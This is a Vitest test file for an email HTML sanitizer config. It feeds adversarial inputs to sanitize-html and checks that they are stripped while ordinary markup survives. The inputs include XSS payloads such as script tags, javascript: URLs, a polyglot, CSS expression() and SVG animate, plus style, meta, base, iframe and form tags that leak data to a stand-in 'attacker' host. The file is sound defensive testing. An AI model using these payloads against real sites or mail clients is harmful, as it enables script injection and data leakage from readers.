/**
 * Adversarial fixtures for the Postbox HTML sanitizer.
 *
 * We don't mount the Vue component — sanitization is a pure function in
 * @owlat/shared/postboxSanitize fed to sanitize-html. These tests assert
 * the security properties of that config directly. The Vue component is
 * a thin shell that calls `sanitizeHtml(html, POSTBOX_SANITIZE_CONFIG)`
 * inline, so test coverage of the config covers the component.
 */

import { describe, it, expect } from 'vitest';
import sanitizeHtml from 'sanitize-html';
import { POSTBOX_SANITIZE_CONFIG } from '@owlat/shared/postboxSanitize';

function sanitize(html: string): string {
	return sanitizeHtml(html, POSTBOX_SANITIZE_CONFIG);
}

describe('PostboxSanitize — script execution surface', () => {
	it('strips <script> tags', () => {
		const out = sanitize('<p>hi</p><script>alert(1)</script>');
		expect(out).not.toMatch(/<script/i);
		expect(out).not.toMatch(/alert\(1\)/);
	});

	it('defeats <scr<script>ipt> polyglot', () => {
		const out = sanitize('<scr<script>ipt>alert(1)</script>');
		expect(out).not.toMatch(/<script/i);
	});

	it('strips inline event handlers from allowed tags', () => {
		const out = sanitize('<a href="#" onclick="alert(1)">x</a>');
		expect(out).not.toMatch(/onclick/i);
	});

	it('strips javascript: protocol from links', () => {
		const out = sanitize('<a href="javascript:alert(1)">x</a>');
		expect(out).not.toMatch(/javascript:/i);
	});

	it('strips javascript: in mixed case', () => {
		const out = sanitize('<a href="JaVaScRiPt:alert(1)">x</a>');
		expect(out).not.toMatch(/javascript:/i);
	});
});

describe('PostboxSanitize — privacy / exfiltration surface', () => {
	it('drops <style> blocks (regex sanitizer would have kept them)', () => {
		const css = '<style>body{background:url(https://attacker/?leak=test)}</style><p>hi</p>';
		const out = sanitize(css);
		expect(out).not.toMatch(/<style/i);
		expect(out).not.toMatch(/attacker/);
	});

	it('drops <meta http-equiv="refresh">', () => {
		const out = sanitize(
			'<meta http-equiv="refresh" content="0;url=https://attacker/"><p>hi</p>'
		);
		expect(out).not.toMatch(/<meta/i);
		expect(out).not.toMatch(/attacker/);
	});

	it('drops <base href>', () => {
		const out = sanitize('<base href="https://attacker/"><p>hi</p>');
		expect(out).not.toMatch(/<base/i);
		expect(out).not.toMatch(/attacker/);
	});

	it('strips javascript: from <img srcset>', () => {
		const out = sanitize('<img srcset="javascript:alert(1) 1x" src="x">');
		// img is allowed but srcset must not contain javascript: payload
		expect(out).not.toMatch(/javascript:/i);
	});

	it('drops <iframe>', () => {
		const out = sanitize('<iframe src="https://attacker/"></iframe>');
		expect(out).not.toMatch(/<iframe/i);
	});

	it('drops <form>', () => {
		const out = sanitize('<form action="https://attacker/"><input /></form>');
		expect(out).not.toMatch(/<form/i);
	});

	it('drops <object> and <embed>', () => {
		const out = sanitize(
			'<object data="https://attacker/x"></object><embed src="https://attacker/y">'
		);
		expect(out).not.toMatch(/<object/i);
		expect(out).not.toMatch(/<embed/i);
	});

	it('drops CSS expression() in style attribute', () => {
		// expression() is non-standard but historically a vector in IE
		const out = sanitize('<p style="width: expression(alert(1))">x</p>');
		expect(out).not.toMatch(/expression\(/i);
	});

	it('drops SVG <animate> tag', () => {
		const out = sanitize(
			'<svg><a><animate attributeName="href" values="javascript:alert(1)" /></a></svg>'
		);
		expect(out).not.toMatch(/<svg/i);
		expect(out).not.toMatch(/animate/i);
		expect(out).not.toMatch(/javascript:/i);
	});

	it('drops <area> inside image maps', () => {
		const out = sanitize(
			'<map><area shape="rect" coords="0,0,1,1" href="javascript:alert(1)"></map>'
		);
		expect(out).not.toMatch(/<area/i);
		expect(out).not.toMatch(/<map/i);
		expect(out).not.toMatch(/javascript:/i);
	});
});

describe('PostboxSanitize — keep legitimate content', () => {
	it('preserves headings, paragraphs, lists', () => {
		const out = sanitize('<h1>Title</h1><p>Body</p><ul><li>item</li></ul>');
		expect(out).toMatch(/<h1>Title<\/h1>/);
		expect(out).toMatch(/<p>Body<\/p>/);
		expect(out).toMatch(/<li>item<\/li>/);
	});

	it('preserves <a> with https href', () => {
		const out = sanitize('<a href="https://example.com">link</a>');
		expect(out).toMatch(/href="https:\/\/example\.com"/);
	});

	it('preserves <img> with https src and alt', () => {
		const out = sanitize('<img src="https://example.com/x.png" alt="x">');
		expect(out).toMatch(/<img/);
		expect(out).toMatch(/src="https:\/\/example\.com\/x\.png"/);
	});

	it('preserves <img> with cid: src (inline attachments)', () => {
		const out = sanitize('<img src="cid:logo@example.com">');
		expect(out).toMatch(/src="cid:logo@example\.com"/);
	});

	it('preserves <img> with data: src', () => {
		const out = sanitize(
			'<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUg">'
		);
		expect(out).toMatch(/src="data:image\/png/);
	});

	it('blocks cid: and data: in <a href>', () => {
		const out = sanitize('<a href="cid:foo">x</a>');
		expect(out).not.toMatch(/href="cid:/);
		const out2 = sanitize('<a href="data:text/html,evil">x</a>');
		expect(out2).not.toMatch(/href="data:/);
	});

	it('preserves whitelisted inline styles', () => {
		const out = sanitize(
			'<p style="color: red; font-size: 14px;">hi</p>'
		);
		expect(out).toMatch(/color:\s*red/);
		expect(out).toMatch(/font-size:\s*14px/);
	});

	it('preserves table layout with colspan / rowspan / bgcolor', () => {
		const out = sanitize(
			'<table><tr><td colspan="2" bgcolor="#fff">hi</td></tr></table>'
		);
		expect(out).toMatch(/<td[^>]*colspan="2"/);
		expect(out).toMatch(/bgcolor="#fff"/);
	});
});
